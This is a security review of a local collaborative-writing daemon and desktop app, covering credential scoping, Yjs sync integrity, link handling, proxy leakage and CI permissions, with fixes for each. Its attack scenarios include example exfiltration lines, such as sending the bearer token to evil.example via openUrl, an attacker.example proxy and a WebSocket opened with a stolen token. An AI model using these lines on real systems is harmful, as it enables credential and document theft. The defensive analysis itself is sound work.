# Proof of Thought — repository security review

**Date:** 2026-09-05 (second pass, same day)
**Reviewed commit:** `f9218a707c1f7111aa003d5f849738c9f2403598` (`Complete connected reviewer setup (#71)`)
**Scope:** the full tree as shipped: `thoughtd`, MCP, store, schema/markdown, Tauri window, native provider chat, GitHub workflows, and the documented relay/share design. `app/src-tauri` and `prototypes/` are outside the Cargo workspace; they were still reviewed as attack surface.

This is a read-only review. No production code was changed. A second pass focused on classic cyber threats: credential theft, proxy/SSRF, CSWSH, CRDT bombs, unauthenticated presence, and confused-deputy HTTP clients.

---

## 1. Verdict

The implemented local trust boundary is **real and largely consistent with the architecture record**:

- `thoughtd` binds **loopback only**.
- The 256-bit platform bearer lives in `daemon.json` at mode `0600`.
- Reviewer credentials are a **separate** secret, hashed at rest, and cannot call direct-write tools.
- Awareness is ephemeral.
- There is **no** whole-document `update_document` tool.
- Provider API keys never enter the webview.

No **critical** issue (unauthenticated remote compromise, reviewer → direct write, or bind-address footgun) was found in the current binary.

The important problems are elsewhere:

1. **Wrong-participant disclosure already exists between configured reviewers** on the same document: pending patches, explanations, other reviewers’ connection metadata, and full provenance/lineage are readable by any reviewer who can `read_document`.
2. **The platform bearer is a workspace-wide superuser.** `AGENTS.md` still describes suggestion-default / per-session direct-write grants that **do not exist**. Anyone who can read `daemon.json` (or XSS the window) can read and rewrite every document and mint reviewers.
3. **`/sync` merges arbitrary Yjs bytes into the whole document**, including the `suggestions` map, with **no schema check**, and attributes every peer as the local human editor. That is survivable while `/sync` is loopback-plus-bearer; it becomes a remote collaborator bug the moment M3 reuses this protocol.
4. **Untrusted link `href`s are not scheme-checked** on the markdown/CRDT ingest path. The owner’s “Open” action will hand them to the OS opener.
5. **The reviewer stdio shim sends loopback Bearer traffic through `HTTP_PROXY`.** Discovery probes already disable proxies; the shim does not. A configured proxy (or a poisoned environment) can steal reviewer secrets and document bodies.

Relay sharing (`thought://join/<doc_id>#<secret>`) is **specified, not implemented**. Several of the worst “wrong participant” failures are therefore still latent — but the live `/sync` codec is already missing the `share_id` field the spec depends on.

---

## 2. Trust model as implemented

| Principal | Credential | What they can do |
|---|---|---|
| **Internal / owner** | Platform bearer in `daemon.json` (also used by the Tauri window on `/sync`, `/editor/*`, and MCP) | Read/write every document; create/trash; manage reviewer connections; apply raw Yjs updates |
| **Configured reviewer** | Per-connection 256-bit secret (`reviewer-credentials/<id>.token`, `0600`); SHA-256 in SQLite | MCP `Read` + `Suggest` only, scoped to `current` document or `all` documents |
| **Built-in chat** | Keychain-held provider key; editor HTTP for suggestions | Sends the **full current document** to OpenAI/Anthropic; document edits still go through Accept/Reject |
| **Remote collaborator / relay** | Not implemented | Spec: `share_id = SHA256(secret)`; no E2E (AD-7) |

Same-OS-user malware is an **accepted** threat (AD-21): this is not an OS sandbox. There is no App Sandbox entitlements file. The remaining questions are: (a) does a **reviewer or future peer** see data they should not, and (b) can a **weaker principal** become a stronger one?

---

## 3. Findings

Severity:

- **High** — realistic confidentiality, integrity, or attribution failure against a documented principal (reviewer, local process with the window, shared-machine neighbor).
- **Medium** — defense-in-depth gap, local DoS, or a bug that becomes High when M3 lands on this protocol.
- **Low** — hardening nits.
- **Info** — accepted design, with residual cost called out.

---

### H1. Reviewers on a document can read every other reviewer’s pending work and the full attribution graph

**Severity:** High (wrong participant)
**Status:** Bug / product-boundary gap, not an AD exception

A reviewer credential that `allows_document(doc)` may call:

- `list_suggestions` — **all** suggestions on that document, not only the caller’s
- `document_actors`, `block_provenance`, `document_lineage`

`list_suggestions` loads the entire CRDT `suggestions` map with no `connection_id` filter:

```591:612:crates/thought-mcp/src/workspace.rs
    pub fn list_suggestions(&self, doc_id: &str) -> Result<SuggestionList, WorkspaceError> {
        self.with(|inner| {
            let doc = inner.doc(doc_id)?;
            let revision = content_revision(doc);
            let suggestions = doc
                .suggestions()?
                .into_iter()
                .map(|suggestion| { /* … */ })
                .collect::<Result<Vec<_>, WorkspaceError>>()?;
```

Each `SuggestionRecord` carries the other proposer’s `actor_id`, `connection_id`, `label`, `source_label`, `reported_model`, `session_id`, `explanation`, and the **normalized patch** (the proposed wording).

Those tools are in the reviewer allow-list:

```25:34:crates/thoughtd/src/tools.rs
const REVIEWER_TOOLS: &[&str] = &[
    "list_documents",
    "read_document",
    "list_suggestions",
    "suggest_change",
    "document_actors",
    "block_provenance",
    "document_lineage",
    "search",
];
```

`read_document` itself is clean: it returns markdown + block ids, not the suggestions map. The leak is the extra MCP surface, which any connected agent will call because the tool descriptions tell it to.

**Attack / disclosure scenario**

1. Owner grants Reviewer A and Reviewer B `current` access to the same draft (two coding agents, or ChatGPT desktop + Claude Code).
2. A proposes a change with an explanation that quotes private context (“don’t mention the acquisition”).
3. B calls `list_suggestions` / `document_lineage` as part of ordinary review and receives A’s pending patch, explanation, connection id, reported model, and session id, plus per-span “who wrote this” for the human and every other agent.

The editor **must** see every pending suggestion in order to Accept/Reject. Reviewer MCP clients do not.

**Fix direction**

- Filter `list_suggestions` for reviewer principals to `proposer.connection_id == caller`.
- Consider dropping `document_lineage` / `block_provenance` / `document_actors` from reviewer tools, or returning only the caller’s own actor row.
- Keep the full list on `/editor/documents/{id}/suggestions` (platform bearer only).

---

### H2. Platform bearer is unrestricted direct write; AGENTS.md describes a grant that does not exist

**Severity:** High (operational / trust-boundary mismatch)
**Status:** Code matches **AD-15**. `AGENTS.md` / `CLAUDE.md` are wrong.

AD-15 is explicit: configured reviewers propose; a future direct-write grant “is not a dormant permission flag in the current protocol.” Internal MCP, however, is not suggestion-default. Possession of `daemon.json` authenticates as `AuthenticatedPrincipal::Internal`, which `authorize` always allows:

```323:324:crates/thoughtd/src/connections.rs
            AuthenticatedPrincipal::Internal => Ok(AuthorizedRequest { connection: None }),
```

`Caller.internal_identity` then builds `ActorRef::agent(...)` and the write tools (`replace_block`, `insert_blocks`, `replace_text`, `delete_block`, `create_document`, `set_document_deleted`) proceed immediately.

The window uses **the same bearer** for MCP, `/sync`, and `/editor/*` (`app/src-tauri/src/lib.rs` `connection()` returns `token`).

**Why this matters**

- A user who pastes the platform token into an MCP client (easy to do if they open `daemon.json`) gives that agent **silent, attribution-bearing, non-reviewable edits** to the whole corpus.
- `AGENTS.md` currently says the opposite: “Agent writes land in the suggestion layer by default. Direct write is a per-session grant.” Operators and other coding agents will configure Internal MCP under a false security assumption.
- The stdio shim is correct: `thought-mcp-stdio` loads a **reviewer** file, not the platform token. The dangerous path is HTTP MCP with the discovery bearer.

**Fix direction**

- Align `AGENTS.md` with AD-15 immediately (docs-only, no protocol change).
- If suggestion-default for owner MCP is actually desired, that is new product work (AD-15’s expiring session capability), not a flag.

---

### H3. `/sync` is a workspace-wide, schema-free Yjs merge attributed as the human editor

**Severity:** High for attribution / integrity today (local bearer); **becomes a remote collaborator bug** if M3 reuses the codec unchanged
**Status:** Bug relative to comments in `thought-core`; accepted loopback threat if you already have the bearer — still the wrong shape for sharing

After the platform bearer is accepted, `Subscribe` / `Update` take a client-supplied `doc_id` with **no per-document ACL**. `Update` does not require a prior subscribe. `apply_peer_update` applies the frame to a candidate replica and commits it **without** `Schema::v0().validate`:

```1015:1057:crates/thought-mcp/src/workspace.rs
    pub fn apply_peer_update(...) {
        // ...
            candidate.apply_update(update)
                .map_err(|e| WorkspaceError::NotFound(format!("bad update: {e}")))?;
            if candidate.encode_state() == current_state {
                return Ok(None);
            }
            inner.commit_candidate(doc_id, candidate, actor, context, None)
```

`commit_candidate` persists whatever `normalize(&candidate.read())` produces. MCP writes **do** validate markdown against the schema (`parse_blocks`). The peer path does not.

The connection task forces `ActorRef::editor()` for every WebSocket peer:

```286:287:crates/thoughtd/src/sync.rs
    // The window is a human's edit path; agents come in over MCP.
    let actor = ActorRef::editor();
```

The suggestions map is part of the same `Y.Doc`. `thought-core` comments that “the daemon is the only writer” of suggestions; that is false on this path. A crafted update can insert, accept, reject, or delete suggestion records without going through `propose_suggestion` / `accept_suggestion`.

Worse: **Accept does not re-validate patch nodes.** `propose_suggestion` runs markdown through `parse_blocks` → `Schema::v0()`. `accept_suggestion` then applies the JSON already in the Y.Map:

```1745:1768:crates/thought-mcp/src/workspace.rs
fn apply_suggestion_patch(doc: &Document, patch: &SuggestionPatch) -> Result<(), WorkspaceError> {
    match patch {
        SuggestionPatch::ReplaceBlock { block_id, nodes }
        | SuggestionPatch::ReplaceText { block_id, nodes } => {
            // first node is inserted as-is; no Schema::v0() here
```

`validate_record` only checks version and a non-empty id. A peer who can `/sync` (or, after M3, a collaborator) can plant a pending suggestion whose `nodes` skip the markdown schema. If the owner clicks Accept, those nodes enter the live document. Combined with H4, that is a way to inject `javascript:` / local `http://127.0.0.1` links that look like they came from a named reviewer.

**Attack scenario (today)**

A local process that can read `daemon.json` (same user, backup tool, XSS in the webview — see H5) opens `ws://127.0.0.1:<port>/sync` with `thought.token.<bearer>` and:

- `Subscribe` + empty state vector → **full CRDT** (content, meta/tombstone, every suggestion).
- `Update` for any known `doc_id` → merge as `human:editor`, including suggestion-map forgery and `deleted_at`.
- No need to speak MCP; no reviewer scope applies.

**Attack scenario (M3, if this codec is reused)**

Architecture §5 shows `SUBSCRIBE { doc_id, share_id, state_vector }`. The implemented `Frame::Subscribe` has **only** `doc_id` + `state_vector` (`crates/thoughtd/src/sync.rs`). A relay that keys rooms by `doc_id` would let anyone who learns a document UUID join without the fragment secret.

**Fix direction**

- Validate (or reject) peer-applied trees against `Schema::v0()`; reject unknown maps/keys if the product wants daemon-only suggestion writes.
- Split suggestion mutations out of generic `Update`, or ignore `suggestions` keys unless the frame came from the editor API.
- Do not attribute `/sync` as `human:editor` once more than one peer exists; carry an untrusted descriptor and label it “reported” (already the M3.3 plan).
- **Before any relay:** add mandatory `share_id` and authorize `(doc_id, share_id)`, never `doc_id` alone.

---

### H4. Untrusted `href`s are stored as-is and opened with the OS handler

**Severity:** High (phishing / local-service hit via a reviewer or agent)
**Status:** Bug. The **UI field** rejects `javascript:`; ingest and Open do not.

Markdown parse copies destinations straight into the link mark:

```233:240:crates/thought-markdown/src/parse.rs
            Tag::Link { dest_url, title, .. } => {
                let mut mark = Mark::new("link").with_attr("href", dest_url.to_string().into());
```

`schema.json` does not constrain `href`. Schema validation special-cases `fontSize` and ignores link schemes.

The local link card **does** refuse `javascript:alert(1)` when typed into the field (`app/src/link.test.ts`), because TipTap `setLink` rejects it. `openDestination` then does:

```62:70:app/src/link.ts
async function openDestination(href: string): Promise<void> {
  // ...
    await openUrl(href);
```

No second allowlist. Tauri capabilities grant `opener:default`. Relative paths and arbitrary schemes (`http://127.0.0.1:<port>/...`, `file:`, `smb:`, `data:`) that survive into the CRDT will be offered as “Open”.

`normalize()` **passes through** any `scheme:` string, so even the UI path would accept `http://127.0.0.1:9229/` if TipTap considers it a valid URI.

**Attack scenario**

1. Reviewer `suggest_change` with `[click me](http://127.0.0.1:445/...)` or an `https://` lookalike.
2. Owner accepts (or Internal MCP writes it directly).
3. Owner clicks Open on the link card.
4. OS handler talks to a local service or a phishing page.

Classic DOM XSS via document HTML is unlikely (ProseMirror + `textContent` for suggestions). **Link open is the gadget.**

**Fix direction**

- Allowlist schemes at **all three** boundaries: markdown parse, schema validate, and `openDestination` (default: `https:` only; maybe `mailto:` / `http:` behind a warning).
- Reject `javascript:`, `data:`, `file:`, `vbscript:`, `blob:`.
- Do not call `openUrl` on relative paths.

---

### H5. The platform bearer is fully available to webview JavaScript; `opener` bypasses CSP for exfil

**Severity:** High if any XSS appears; Medium as defense-in-depth today
**Status:** Design (token must reach the window) with a dangerous IPC/CSP combination

```38:48:app/src-tauri/src/lib.rs
fn connection(state: tauri::State<'_, Daemon>) -> Connection {
    Connection {
        sync_url: /* ws://127.0.0.1/sync */,
        mcp_url: state.url.clone(),
        token: state.token.clone(),
```

`app/src/main.ts` `invoke("connection")` keeps the token in JS memory and puts it on every MCP `Authorization` header and as `thought.token.${token}` on the WebSocket.

Mitigations already present: no token in URLs; no Vite `/__thought/connection` endpoint (`native-bootstrap-boundary.test.ts`); loopback bind.

Gaps:

- `withGlobalTauri: true` (`app/src-tauri/tauri.conf.json`) exposes IPC on `window`.
- CSP is `default-src 'self'; connect-src 'self' http://127.0.0.1:* ws://127.0.0.1:*; style-src 'self' 'unsafe-inline'; img-src 'self' data:` — no `base-uri`, `object-src`, `frame-ancestors`. Fetch-exfil to the public internet is blocked, **but** `opener:default` lets script call `openUrl('https://evil.example/?t=' + token)` and walk the bearer off-box.
- DEV builds assign `window.__thought = { editor, doc, provider }`.

**Fix direction**

- Disable `withGlobalTauri` unless something still needs it.
- Tighten CSP (`base-uri 'none'`, `object-src 'none'`, `frame-ancestors 'none'`).
- Allowlist `openUrl` schemes (same as H4); this also kills the CSP bypass.
- Longer term: keep the bearer in Rust and proxy `/sync` from native code so the webview never sees it.

---

### H6. `THOUGHT_HOME` / SQLite / logs are not forced to owner-only

**Severity:** High on a shared Unix host; Low on a single-user Mac with a private home directory
**Status:** Bug. Credential dir is hardened; the home that holds the database is not.

```661:661:crates/thoughtd/src/discovery.rs
    std::fs::create_dir_all(parent)?;
```

```21:22:crates/thoughtd/src/logging.rs
    let _ = std::fs::create_dir_all(home);
```

```310:311:crates/thought-store/src/lib.rs
        Store::wrap(Connection::open(path)?)
```

`daemon.json` is `0600` with `create_new`. Reviewer-credential directory is `0700` / files `0600`. The support directory, `thought.db`, WAL/SHM sidecars (`PRAGMA journal_mode=WAL`), and `thoughtd-*.log` inherit umask (typically `0755` / `0644`).

**Attack scenario**

On a shared Linux machine (`~/.local/share/thought`), another local account reads `thought.db` / `-wal` and the last week of logs. The bearer file is `0600`, but **the private writing is in the database**, not in `daemon.json`.

Tool failures are logged at `warn` with the full error string (`crates/thoughtd/src/tools.rs` `failed()`), which can include markdown validation fragments and find/replace text.

**Fix direction**

- `chmod 0700` on `THOUGHT_HOME` after `create_dir_all` (same helper as reviewer credentials).
- `chmod 0600` on `thought.db` after open; consider a SQLite `vfs` / umask so WAL/SHM match.
- Open logs with `0600`.

---

### H7. `thought-mcp-stdio` (and default `ureq`) honor `HTTP_PROXY`; discovery already opted out

**Severity:** High (credential + corpus theft via proxy)
**Status:** Bug. The loopback probe path already treats this as unsafe.

ureq’s **default agent** reads `ALL_PROXY` / `HTTPS_PROXY` / `HTTP_PROXY` (and lowercase variants). The stdio shim uses that default:

```157:171:crates/thoughtd/src/bin/thought-mcp-stdio.rs
fn send_once(...) -> Result<Option<String>, ureq::Error> {
    let mut request = ureq::post(&daemon.url)
        .header("Authorization", &format!("Bearer {credential}"))
        .header("Content-Type", "application/json")
        .header("Accept", "application/json, text/event-stream");
```

`daemon.url` is `http://127.0.0.1:<port>/mcp`. ureq does **not** document an automatic loopback bypass; `NO_PROXY` is the only documented exemption.

The discovery client, by contrast, builds a dedicated agent with `.proxy(None)`:

```172:181:crates/thoughtd/src/discovery.rs
fn local_agent() -> ureq::Agent {
    ureq::Agent::config_builder()
        .timeout_global(Some(Duration::from_secs(1)))
        .proxy(None)
        .max_redirects(0)
```

Built-in chat (`app/src-tauri/src/pro_chat.rs` `agent()`) also uses `config_builder` **without** `proxy(None)`, so provider requests (with the Keychain API key in `Authorization` / `x-api-key`) follow the same env proxy if that builder still inherits defaults.

**Attack scenario**

1. `HTTP_PROXY=http://attacker.example:8080` is set in the environment that launches ChatGPT desktop / Codex / Claude (corporate proxy, VPN helper, or malware). `NO_PROXY` does not list `127.0.0.1`.
2. The user pastes the Proof of Thought setup command. The shim POSTs `Authorization: Bearer <reviewer-secret>` and every `read_document` / `suggest_change` body to the proxy as an absolute `http://127.0.0.1` URL.
3. The proxy learns the 256-bit reviewer credential and the private documents. It may also fail the connection (it would dial *its* localhost), which looks like “MCP is broken” rather than theft.
4. Same-user malware that can only set env — not read `~/.local/share/thought/reviewer-credentials/` if modes were correct — still steals the secret off the wire.

This is **not** AD-21 “can read owner files.” It is a confused-deputy HTTP client sending secrets off-box.

**Fix direction**

- Use the same `local_agent()` (proxy disabled, no redirects, loopback URL still required) for every shim → daemon request.
- Set `proxy(None)` on the pro-chat agent, or pin `NO_PROXY=127.0.0.1,localhost` and still disable env proxy for Keychain-backed calls unless the user has opted into a system proxy for providers.
- Add a regression test: with `HTTP_PROXY` pointing at a sink, the shim still talks directly to 127.0.0.1 and the sink never sees `Authorization`.

---

### M1. Suggestions replicate in the CRDT, so every future share peer and the relay operator sees them

**Severity:** Medium (today: editor windows only). High once M3 exists.
**Status:** Documented for content (AD-7); not called out for **pending reviewer text**.

Suggestions are a `Y.Map` on the document. Any `/sync` replica receives them. AD-7 already says the relay can read plaintext frames. Pending explanations and patches are therefore:

- visible to every window on the machine (fine);
- visible to every future collaborator, not only the owner;
- visible to the relay host, including rejected proposals that never entered the prose.

`list_suggestions` for reviewers (H1) is the same data, exposed early.

**Fix direction:** treat suggestions as owner-only metadata, or encrypt/separate them before share; at minimum document that sharing a doc shares every outstanding proposal.

---

### M2. `all` document scope is a full-corpus read grant with an easy UI

**Severity:** Medium (product trust)
**Status:** Design (AD-21), easy to mis-grant

`ReviewerAccess::all()` plus `authorize(..., document_id: None)` skips the per-id check; `list_documents_scoped` / `search_scoped` then return the whole live (or trash) set. Titles, bodies (via `read_document` / `search` snippets), lineage, and suggestions of every document become available to that MCP client.

ChatGPT desktop and Codex **share MCP config on the same Mac** (stated in `docs/suggestions.md` and the setup copy). An “all documents” Codex connection is also a ChatGPT-desktop connection if the user follows the documented setup.

`current` scope is enforced (`current_scope_blocks_other_documents` test) and does not leak existence of other ids (other ids fail as “outside this reviewer connection” before `NoSuchDocument`).

**Fix direction:** default to `current`; require an extra confirmation for `all`; remind that Codex/ChatGPT share config.

---

### M3. No WebSocket / awareness size or rate limits; subscribe channels never expire

**Severity:** Medium (local DoS; worse on a relay)
**Status:** Hardening gap

MCP HTTP bodies are capped at 16 MiB. `/sync` is not:

- `Frame::decode` only checks that `id_len` fits the **already-received** message; tokio/tungstenite frame size is otherwise unbounded.
- `Awareness` payloads are fanout-only (good — not persisted) but unbounded and spoofable by any subscriber.
- `SyncState::channel` inserts a broadcast channel **before** `sync_since` succeeds, including for unknown `doc_id`s, and **never removes** it.

```356:362:crates/thoughtd/src/sync.rs
            let channel = state.channel(&doc_id);
            subscriptions.push(channel.subscribe());
            senders.insert(doc_id.clone(), channel);
```

A bearer-holding client can Subscribe to unbounded fake ids and stream huge Awareness/Update frames (broadcast capacity 256, then lag).

`list_documents` / `search` `limit` is an unbounded `usize` (default 50). `list_documents_scoped` always loads **every** row (`list_documents(usize::MAX)`) then filters.

**Fix direction:** max frame size (~1–2 MiB), max concurrent subscriptions, drop idle channels, cap `limit` (e.g. 200), reject Subscribe for unknown documents **before** creating a channel.

---

### M4. CORS reflects any `http://localhost:*` / `http://127.0.0.1:*` origin

**Severity:** Medium (defense in depth; bearer still required)
**Status:** Intentional for Tauri dev (`http://localhost:1420`)

```211:215:crates/thoughtd/src/main.rs
                        *o == "tauri://localhost"
                            || o.starts_with("http://localhost:")
                            || o.starts_with("http://127.0.0.1:")
```

A malicious page on another local port that **also** obtains the bearer (H5, or a leaked `daemon.json`) can call the daemon from the browser. Open-web origins are excluded; CSRF without the token fails because auth is not cookie-based.

Preflight is answered before auth (necessary). `mcp-session-id` is CORS-exposed; sessions still require Bearer on every request (checked).

**Fix direction:** allowlist the exact Tauri origin and the configured Vite port rather than any localhost port.

---

### M5. FTS5 `MATCH` is attacker-controlled query language

**Severity:** Medium (DoS / surprising matches, not classic SQLite injection)
**Status:** Parameterized SQL; FTS syntax is the issue

```786:790:crates/thought-store/src/lib.rs
            "SELECT doc_id, snippet(doc_fts, 2, '<b>', '</b>', '…', 12)
             FROM doc_fts WHERE doc_fts MATCH ?1 LIMIT ?2",
```

Bind parameters prevent SQL injection. The bound string is still an FTS5 query (`AND`/`OR`/`NOT`/`NEAR`/`*`/`"`). A reviewer with `all` scope can craft matches or error-DoS. Scoped search adds `AND doc_id = ?2` **outside** `MATCH`, so current-scope cannot jump documents that way.

Snippets wrap hits in `<b>`. The Tauri switcher **does not render snippets** (titles via `textContent` only). Other MCP UIs might.

**Fix direction:** quote/sanitize user text as an FTS phrase; cap query length; do not emit HTML wrappers (or document that snippets are unsafe HTML).

---

### M6. Self-asserted actor, display name, and model are easy to read as verified identity

**Severity:** Medium (misleading attribution — AD-6 / AD-21)
**Status:** Documented design; residual UX risk

- Internal MCP: `agent` / `model` / `session` are caller-chosen (`ActorRef::agent` → `agent:{name}`).
- Reviewers cannot pick `actor_id` / label (those come from the connection). They **can** set `model` and `session`; `note_reported_model` persists the model for the connections panel.
- Built-in chat labels providers as “(reported)” — good.
- Future M3 actor descriptors on `UPDATE` are explicitly spoofable (`docs/architecture.md` M3.3).

A reviewer sending `model: "verified-human"` will show up in suggestion slips and `last used` as that string. The connections panel copy is careful; suggestion UI shows `proposer.label` without “reported”.

**Fix direction:** always suffix reported model/label in reviewer-facing and owner-facing UI; never use “verified” assurance for MCP ingress (code already uses `Assurance::Reported` for those mutations — keep it that way in the window).

---

### M7. Built-in chat exfiltrates the entire document to a third-party provider

**Severity:** Medium–High privacy (intentional)
**Status:** AD-23 / AD-25, with a disclosure line

`send_provider_chat` requires `disclosure_version: 2` and posts the **full normalized document**, optional focus, up to five attachments, and chat history to hardcoded HTTPS OpenAI/Anthropic endpoints. Native client: `https_only(true)`, `max_redirects(0)`, bounded bodies, keys from Keychain, JS never sees the key.

Residual:

- No per-send confirmation beyond static disclosure.
- Visible chat history (which may quote the document) is stored in **webview `localStorage`** (`thought.pro-chat.v1.*`), not Keychain.
- A compromised webview can invoke `send_provider_chat` with an arbitrary tree (AD-24 already notes a modified window can alter pending proposals).

**Fix direction:** optional per-send confirm; encrypt-at-rest or native-side history; redaction of unused sections.

---

### M8. Peer and MCP session grants: thin regression tests for reviewer *calls*

**Severity:** Medium (test gap, not a missing check)

Enforcement is defense-in-depth: capability gate + tool-list filter + `suggest_change` requiring a connection. Transport tests assert reviewers **do not see** write tools (`crates/thoughtd/tests/mcp_transport.rs`). There is **no** integration test that `tools/call` `replace_block` with a reviewer bearer returns authorization denied. The check exists (`ReviewerOperation::Edit` → permission denied).

`authorize(..., document_id: None)` is used for list/search/create. Create is separately gated by `Create`. A future tool that authorizes with `None` then takes a free `doc_id` would skip current-scope. Fragile.

**Fix direction:** add the reviewer `replace_block` deny test; lint/assert that mutating tools always pass `Some(doc_id)`.

---

### M9. `thought://` share links and relay URL validation are unspecified in code

**Severity:** Medium (future footgun)
**Status:** Schema columns only (`documents.share_id`, `relay_url`); no client

When implemented, missing pieces that would immediately become High:

- Fragment `#secret` in argv, logs, crash reports, or WebSocket URLs.
- Relay client following user-supplied `relay_url` (`file:`, link-local, metadata IPs, `http://`) → SSRF / cleartext push of the corpus. Discovery probes already set `proxy(None)`, `max_redirects(0)`, loopback-only — copy that pattern.
- No revocation (M3.6). Screenshot of the link is the grant (already documented).

---

### M10. GitHub `claude.yml` is not association-gated

**Severity:** Medium (CI / token abuse)
**Status:** Contrast with `claude-code-review.yml`

`claude-code-review.yml` runs only for `OWNER` | `MEMBER` | `COLLABORATOR` and uses `--permission-mode bypassPermissions`.

`.github/workflows/claude.yml` runs on **any** `@claude` issue comment, including first-time contributors, with `CLAUDE_CODE_OAUTH_TOKEN`, `contents: read`, `pull-requests: read`, `issues: read`, `id-token: write`. It is not `pull_request_target` (good). Default `actions/checkout` on `issue_comment` is the default branch, not the fork HEAD (mitigates RCE). The OAuth token can still be exercised by whoever can comment `@claude`.

Release workflow is strong: default `contents: read`, `persist-credentials: false`, tag⊆main, signing all-or-nothing, notarization key in `$RUNNER_TEMP` mode 600.

**Fix direction:** add the same `author_association` guard to `claude.yml`; drop `bypassPermissions` on review if inline comments are the only needed tool.

---

### M11. `/sync` WebSocket does not check `Origin` (CSWSH)

**Severity:** Medium (needs the bearer; browsers do not apply CORS to WebSockets)
**Status:** Hardening gap

HTTP CORS middleware **adds** headers for allowed origins; it does **not reject** other origins. A page at `https://evil.example` can still `new WebSocket("ws://127.0.0.1:<port>/sync", ["thought.v1", "thought.token."+stolen])`. Fetch from that origin would be unreadable without CORS; WebSocket binary frames would not.

Without the 256-bit token this is a failed handshake (401). With XSS, a leaked `daemon.json`, or H5’s `openUrl` gadget, CSWSH is the channel that actually drives H3.

DNS rebinding to 127.0.0.1 does not help by itself: `Origin` would be the attacker host, still token-gated. Do not treat rebinding as a substitute for stealing the bearer — but do not skip Origin checks on a future public relay.

**Fix direction:** require `Origin` to be `tauri://localhost` or the exact dev origin on `/sync` and `/editor/*`. Refuse missing/null origins on browser upgrades.

---

### M12. Yjs XML is applied with unbounded depth; MCP actor names are unbounded

**Severity:** Medium (authenticated local DoS of `thoughtd`)
**Status:** Hardening gap

`read_children` walks `XmlFragment` recursively with no depth cap (`crates/thought-core/src/tree.rs`). `apply_peer_update` then `normalize(&candidate.read())` on commit. A bearer-holding client can send a deeply nested Yjs tree and stack-overflow or OOM the daemon — taking down **all** documents, not one connection.

Internal MCP `Caller.agent` is copied into `ActorRef` with no length cap beyond the 16 MiB body. That string is stored in `actors.display_name` and echoed in presence JSON to every `/sync` subscriber.

**Fix direction:** reject peer updates whose decoded tree exceeds a depth/node budget; cap `agent` / `model` / `session` the way reviewer `reported_model` is already capped (256 bytes).

---

### M13. Awareness is an unauthenticated map; any subscriber can overwrite another caret

**Severity:** Medium today (same-user). High on a shared document after M3.
**Status:** Protocol limitation of `y-protocols` awareness, unmitigated

`Frame::Awareness` is fanout if the sender `Subscribe`d. There is no binding of payload client-ids to the socket. A peer can publish states for other client ids (spoof names/colors, hide a caret) or flood fake users.

The window puts `user.color` into `element.style.setProperty("--who", ...)` (`app/src/editor.ts`, `app/src/main.ts`). Names use `textContent` (good). `--who` is used as `background` / `border-color` in `styles.css`. A `url(...)` value is mostly stopped by CSP (`img-src 'self' data:`), so this is not a practical CSP bypass today; it is still untrusted CSS.

**Fix direction:** ignore awareness entries whose client id is not the sender’s; allowlist `--who` as `#rrggbb`; do not reuse this awareness channel on the relay without that filter.

---

### L1. Non-constant-time platform-bearer compare

`value == expected` in MCP and `/sync` middleware. 256-bit secret over loopback: practical timing extraction is unrealistic. Reviewer auth hashes then looks up — better.

---

### L2. Unauthenticated `GET /health/identity`

Returns service name, protocol version, `instance_id`. Documented discovery handshake (AD-10). Confirms `thoughtd` to a local port scanner; no token. `/health/mcp` is authenticated.

---

### L3. WebSocket token in `Sec-WebSocket-Protocol`

Better than a query string (logs/history). Still visible in DevTools and some proxies. Acceptable for loopback; do not reuse on a public relay without a different auth story.

---

### L4. Reviewer credential temp files use `create`+`truncate`, not `create_new`

Inside a `0700` directory with `0600` mode. Weaker than `daemon.json`’s `create_new`. Same-user can always read owner files (AD-21).

---

### L5. `innerHTML` for the document-switcher hint

`app/src/main.ts` interpolates `ACCEL_LABEL` (a fixed platform string) into `innerHTML`. Not user-controlled today. Prefer `textContent` / static HTML.

---

### L6. WAL `synchronous=NORMAL` comment assumes a relay that does not exist

```341:345:crates/thought-store/src/lib.rs
        // WAL so a reader never blocks the writer. NORMAL trades a fsync per
        // commit for the small risk of losing the last few updates on power
        // loss — acceptable because the relay and the peer replicas hold them
        // too
        conn.pragma_update(None, "journal_mode", "WAL")?;
```

There is no relay. A crash can lose the tail of the op log. Durability, not confidentiality.

---

### L7. Prompt-injection via suggestion markdown and explanations

Explanations are capped at 16 KiB and rendered with `textContent` (no DOM XSS). The text still instructs the **human** and any **other agent** that reads `list_suggestions` (H1). Suggestion markdown is schema-validated at **proposal** time but can be up to the 16 MiB MCP body; built-in chat suggestions are capped at 256 KiB. Inherent LLM-tooling risk. Forged CRDT suggestions skip that validation (H3).

---

### L8. API keys: no CRLF reject; Keychain item has no extra ACL

`provider_credentials::valid` rejects empty, oversized, and NUL keys, not CR/LF. A bizarre Keychain value could theoretically inject HTTP headers if the HTTP crate did not reject them (ureq/http usually will). Keychain storage uses generic passwords with default login-keychain ACLs (no `ThisDeviceOnly` / presence required). Same-user, AD-21.

---

## 4. What is solid (do not regress)

These controls were checked and should be treated as invariants:

| Control | Where |
|---|---|
| Bind `127.0.0.1:0` only | `crates/thoughtd/src/main.rs` |
| 256-bit `/dev/urandom` token; `daemon.json` atomic `0600` `create_new` | `discovery.rs` |
| Discovery URL must be `http://127.0.0.1:<port>/mcp` matching `port` | `discovery::read` |
| Discovery HTTP client: `proxy(None)`, no redirects, 1s timeout | `discovery::local_agent` |
| Token not logged; stderr only prints the port | `main.rs` |
| Reviewer secrets hashed (SHA-256) in SQLite; JSON serialization omits the hash | `connections.rs`, test `connection_serialization_never_contains_credentials` |
| Setup command contains connection id, never the secret | `app/src/reviewer-setup.ts` |
| Connection ids charset-limited (no path traversal on `{id}.token`) | `valid_connection_id` |
| Reviewers cannot use `/editor/*` or `/sync` (platform bearer only) | `main.rs` editor middleware |
| Reviewer write tools denied even if called | `authorize` + `REVIEWER_TOOLS` |
| `suggest_change` refused for Internal (requires a connection) | `tools.rs` |
| Stale suggestion cannot be accepted | `workspace.rs` |
| MCP Bearer is checked on every request (session id is not a substitute) | `main.rs` middleware |
| Editor API paths `encodeURIComponent` document/suggestion ids | `app/src/editor-api.ts` |
| Awareness not persisted | `sync.rs`; tests in `sync_endpoint.rs` |
| No `update_document(full_markdown)` | MCP surface |
| Import path never crosses IPC; size cap; atomic export | `app/src-tauri/src/lib.rs` |
| Provider keys: native secure field + Keychain; JS sees booleans only | `provider_credentials.rs`, `macos_secure_input.rs` |
| Pro-chat: HTTPS-only, no redirects, disclosure version, untrusted-document system prompt | `pro_chat.rs` |
| Font-size CSS injection rejected | `normalize_font_size` |
| New-window `doc_id` cannot be a path | `document_window_path` |
| Store SQL is parameterized | `thought-store` |
